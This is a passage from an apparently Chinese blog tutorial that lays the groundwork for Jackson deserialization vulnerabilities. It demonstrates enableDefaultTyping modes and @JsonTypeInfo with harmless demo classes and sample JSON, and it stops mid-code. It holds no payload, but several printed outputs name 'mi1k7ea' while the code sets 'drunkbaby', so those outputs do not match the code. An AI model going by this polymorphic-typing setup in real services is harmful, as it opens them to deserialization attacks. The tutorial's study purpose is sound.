class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JAVA_LANG_OBJECTTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// 设置JAVA_LANG_OBJECT  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们同样写一个类，是没有添加 <code>enableDefaultTyping()</code> 的，来对比一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NoJava_LANG_OBJECT</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/compare.png" class><p>输出对比看到，通过 enableDefaultTyping() 设置设置 JAVA_LANG_OBJECT 后，会多输出 Hacker 类名，且在输出的 Object 属性时直接输出的是 Hacker 类对象，也就是说同时对 Object 属性对象进行了序列化和反序列化操作：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置JAVA_LANG_OBJECT  </span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;mi1k7ea&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.mi1k7ea.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;Jackson&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span>  </span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=mi1k7ea<span class="punctuation">,</span> com.mi1k7ea.Hacker@<span class="number">7</span>f9a81e8  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 未设置JAVA_LANG_OBJECT  </span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;mi1k7ea&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;Jackson&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span>  </span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=mi1k7ea<span class="punctuation">,</span> <span class="punctuation">&#123;</span>skill=Jackson<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h4><p>OBJECT_AND_NON_CONCRETE：除了前面提到的特征，当类里有 Interface、AbstractClass 类时，对其进行序列化和反序列化（当然这些类本身需要时合法的、可被序列化的对象）。</p><ul><li>此外，<strong>enableDefaultTyping()默认的无参数的设置就是此选项。</strong></li></ul><p>添加一个 Sex 接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.object_and_non_concrete;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加 MySex 类实现 Sex 接口类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.object_and_non_concrete;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySex</span> <span class="keyword">implements</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="type">int</span> sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.sex = sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改 Person 类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着编写序列化与反序列化的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.object_and_non_concrete;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OBJECT_AND_NON_CONCRETE_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        p.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// 设置OBJECT_AND_NON_CONCRETE  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);  </span><br><span class="line">        <span class="comment">// 或直接无参调用，输出一样  </span></span><br><span class="line">        <span class="comment">//mapper.enableDefaultTyping();  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出，可以看到该Interface类属性被成功序列化和反序列化：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.java_lang_object.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.object_and_non_concrete.MySex&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker@<span class="number">6</span>d00a15d<span class="punctuation">,</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex@<span class="number">51</span>efea79</span><br></pre></td></tr></table></figure><h4 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h4><p>NON_CONCRETE_AND_ARRAYS：除了前面提到的特征外，还支持 Array 类型。</p><p>编写序列化与反序列化的代码，在 Object 属性中存在的是数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.non_concrete_and_arrays;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NON_CONCRETE_AND_ARRAYS_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        Hacker[] hackers = <span class="keyword">new</span> <span class="title class_">Hacker</span>[<span class="number">2</span>];  </span><br><span class="line">        hackers[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        hackers[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        p.object = hackers;  </span><br><span class="line">        p.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// 设置NON_CONCRETE_AND_ARRAYS  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，类名变成了 <code>”[L”+类名+”;”</code>，序列化 Object 之后为数组形式，反序列化之后得到<code>[Lcom.mi1k7ea.Hacker;</code> 类对象，说明对 Array 类型成功进行了序列化和反序列化：</p><h4 id="NON-FINAL"><a href="#NON-FINAL" class="headerlink" title="NON_FINAL"></a>NON_FINAL</h4><p>NON_FINAL：除了前面的所有特征外，包含即将被序列化的类里的全部、非 final 的属性，也就是相当于整个类、除 final 外的属性信息都需要被序列化和反序列化。</p><p>修改 Person 类，添加 Hacker 属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">    <span class="keyword">public</span> Hacker hacker;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s, %s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex, hacker == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : hacker);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写序列化与反序列化类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping.non_final;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.Person;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker;  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex;  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NON_FINAL_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        p.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();  </span><br><span class="line">        p.hacker = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="comment">// 设置NON_FINAL  </span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，成功对非 final 的 hacker 属性进行序列化和反序列化：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.Person&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.java_lang_object.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.object_and_non_concrete.MySex&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;hacker&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.drunkbaby.defaultTyping.java_lang_object.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker@<span class="number">6</span>d00a15d<span class="punctuation">,</span> com.drunkbaby.defaultTyping.object_and_non_concrete.MySex@<span class="number">51</span>efea79<span class="punctuation">,</span> com.drunkbaby.defaultTyping.java_lang_object.Hacker@<span class="number">5034</span>c75a</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>从前面的分析知道，DefaultTyping 的几个设置选项是逐渐扩大适用范围的，如下表：</p><table><thead><tr><th>DefaultTyping类型</th><th>描述说明</th></tr></thead><tbody><tr><td>JAVA_LANG_OBJECT</td><td>属性的类型为Object</td></tr><tr><td>OBJECT_AND_NON_CONCRETE</td><td>属性的类型为Object、Interface、AbstractClass</td></tr><tr><td>NON_CONCRETE_AND_ARRAYS</td><td>属性的类型为Object、Interface、AbstractClass、Array</td></tr><tr><td>NON_FINAL</td><td>所有除了声明为final之外的属性</td></tr></tbody></table><h3 id="JsonTypeInfo-注解"><a href="#JsonTypeInfo-注解" class="headerlink" title="@JsonTypeInfo 注解"></a>@JsonTypeInfo 注解</h3><p><code>@JsonTypeInfo</code> 注解是 Jackson 多态类型绑定的一种方式，支持下面5种类型的取值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)</span>  </span><br><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)</span></span><br></pre></td></tr></table></figure><p>下面我们逐个看下。</p><h4 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h4><p><strong>JsonTypeInfo_Id_NONE_Test.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsonTypeInfo_Id_NONE_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person2</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person2</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;drunkbaby&quot;</span>;  </span><br><span class="line">        p.object = <span class="keyword">new</span> <span class="title class_">Hacker</span>();  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person2</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person2.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person2 类，给 object 属性添加 <code>@JsonTypeInfo</code> 注解，指定为 <code>JsonTypeInfo.Id.NONE</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person2</span> &#123;  